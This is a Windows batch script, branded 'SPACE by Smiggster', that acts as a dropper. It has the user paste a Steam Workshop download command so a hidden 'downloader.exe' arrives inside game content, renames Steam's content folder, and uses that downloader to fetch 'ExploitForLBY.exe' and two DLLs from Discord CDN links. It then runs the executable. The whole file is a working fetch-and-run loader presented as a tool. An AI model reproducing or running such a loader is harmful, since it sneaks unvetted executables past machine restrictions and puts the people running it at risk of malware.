@echo off
title SPACE by Smiggster
color 6
B:
mkdir Space
C:
cd "C:\Program Files (x86)\Steam"
start "" "steam.exe" "steam://open/console" >NUL 2>&1
cls
echo SPACE started.
echo download_item 304930 2236589697|clip
echo Made by Smiggster
echo Press CTRL+V in the Console.
goto loop

:loop
IF exist "C:\Program Files (x86)\Steam\steamapps\content\app_304930\item_2236589697\bruh\downloader.exe" goto found
goto checkloop

:checkloop
timeout 1 >NUL 2>&1
goto loop

:found
TIMEOUT 3 /NOBREAK > NUL
ren "C:\Program Files (x86)\Steam\steamapps\content" space
set dl="C:\Program Files (x86)\Steam\steamapps\space\app_304930\item_2236589697\bruh\downloader.exe"
B:
cd Space
cls
echo Downloading SPACE
%dl% -LJOk https://cdn.discordapp.com/attachments/696659206207701084/772034973129637908/ExploitForLBY.exe >NUL 2>&1
%dl% -LJOk https://cdn.discordapp.com/attachments/696659206207701084/772034974974869534/MetroFramework.Fonts.dll >NUL 2>&1
%dl% -LJOk https://cdn.discordapp.com/attachments/696659206207701084/772034976124108800/MetroFramework.dll >NUL 2>&1
start "" "B:\Space\ExploitForLBY.exe"
exit